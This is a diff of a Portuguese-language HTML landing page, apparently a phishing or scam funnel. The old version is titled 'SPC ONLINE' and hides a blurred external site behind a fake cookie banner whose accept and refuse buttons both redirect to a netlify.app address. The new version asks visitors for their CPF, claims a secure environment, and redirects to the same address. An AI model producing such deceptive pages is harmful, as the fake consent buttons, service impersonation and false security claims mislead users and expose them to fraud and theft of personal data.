@@ -1,137 +1,181 @@
-
-
+<!DOCTYPE html>
+<html lang="pt-BR">
 <head>
-<title>SPC ONLINE</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-</head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Portal de Consulta</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
 
 <style>
 
-/* RESET */
 *{
 margin:0;
 padding:0;
 box-sizing:border-box;
-}
-
-/* BLOQUEIA SCROLL */
-html,body{
-height:100%;
-overflow:hidden;
+font-family:'Inter',sans-serif;
 }
 
 body{
-position:fixed;
-width:100%;
-height:100dvh;
+background:#eef2f7;
 }
 
-/* container */
-.site-wrapper{
-position:relative;
-width:100%;
-height:100dvh;
+/* HEADER */
+
+.header{
+background:#0f172a;
+color:white;
+padding:18px;
+text-align:center;
+font-weight:600;
 }
 
-/* iframe */
-.site-frame{
+/* CONTAINER */
+
+.container{
+max-width:420px;
+margin:40px auto;
+padding:20px;
+}
+
+/* CARD */
+
+.card{
+background:white;
+padding:30px;
+border-radius:12px;
+box-shadow:0 15px 40px rgba(0,0,0,0.08);
+text-align:center;
+}
+
+/* TITULO */
+
+h1{
+font-size:24px;
+margin-bottom:10px;
+}
+
+/* TEXTO */
+
+.desc{
+font-size:14px;
+color:#555;
+margin-bottom:20px;
+}
+
+/* INPUT */
+
+.input{
 width:100%;
-height:100%;
+padding:14px;
+border:1px solid #ddd;
+border-radius:8px;
+margin-bottom:15px;
+}
+
+/* BOTÃO */
+
+.btn{
+width:100%;
+background:#2563eb;
+color:white;
 border:none;
-filter:blur(6px);
-transition:filter .4s;
-pointer-events:none;
-}
-
-/* COOKIE */
-.cookie-overlay{
-position:absolute;
-bottom:0;
-left:0;
-width:100%;
-background:white;
-padding:25px;
-box-shadow:0 -10px 30px rgba(0,0,0,0.2);
-font-family:Arial;
-z-index:9999;
-}
-
-/* botões */
-.cookie-buttons{
-margin-top:15px;
-}
-
-.cookie-buttons button{
-padding:12px 25px;
-border-radius:6px;
-border:1px solid #c33;
-background:white;
-color:#c33;
-margin-right:10px;
+padding:15px;
+border-radius:8px;
+font-weight:600;
+font-size:16px;
 cursor:pointer;
 }
 
-.cookie-buttons button.accept{
-background:#c33;
-color:white;
+.btn:hover{
+background:#1d4ed8;
 }
 
-/* MOBILE */
-@media (max-width:600px){
+/* INFO */
 
-.cookie-overlay{
-padding:20px;
-font-size:16px;
+.info{
+margin-top:15px;
+font-size:12px;
+color:#777;
 }
 
-.cookie-buttons{
-display:flex;
-flex-direction:column;
-gap:10px;
+/* SEGURANÇA */
+
+.security{
+margin-top:20px;
+font-size:13px;
+color:#444;
+background:#f1f5ff;
+padding:12px;
+border-radius:8px;
 }
 
-.cookie-buttons button{
-width:100%;
-padding:16px;
-font-size:16px;
+/* FOOTER */
+
+.footer{
+margin-top:25px;
+text-align:center;
+font-size:12px;
+color:#777;
 }
 
+.footer a{
+color:#2563eb;
+margin:0 6px;
+text-decoration:none;
 }
 
 </style>
+</head>
 
+<body>
 
-<div class="site-wrapper">
+<div class="header">
+Central de Consulta
+</div>
 
-<iframe
-class="site-frame"
-id="siteFrame"
-src="https://prismatic-crostata-496139.netlify.app/">
-</iframe>
+<div class="container">
 
+<div class="card">
 
-<div class="cookie-overlay" id="cookieBox">
+<h1>Consultar Informações</h1>
 
-<strong>Configurações de cookies</strong><br>
-Utilizamos cookies para melhorar sua navegação e oferecer uma melhor experiência. Para mais informações, consulte nossa Política de Cookies.
+<div class="desc">
+Informe seus dados para acessar informações disponíveis online.
+</div>
 
-<div class="cookie-buttons">
-<button class="accept" onclick="goLink()">Aceitar todos</button>
-<button onclick="goLink()">Recusar</button>
+<input class="input" type="text" placeholder="Digite seu CPF">
+
+<button class="btn" onclick="goLink()">
+Continuar consulta
+</button>
+
+<div class="security">
+🔒 Ambiente seguro • Seus dados não são armazenados nesta página
+</div>
+
+<div class="info">
+Você será direcionado para uma página externa com mais informações.
 </div>
 
 </div>
 
+<div class="footer">
+<a href="#">Política</a> |
+<a href="#">Termos</a> |
+<a href="#">Contato</a>
 </div>
 
+</div>
 
 <script>
 
 function goLink(){
-
 window.location.href="https://prismatic-crostata-496139.netlify.app/";
-
 }
 
 </script>
-```
+
+</body>
+</html>
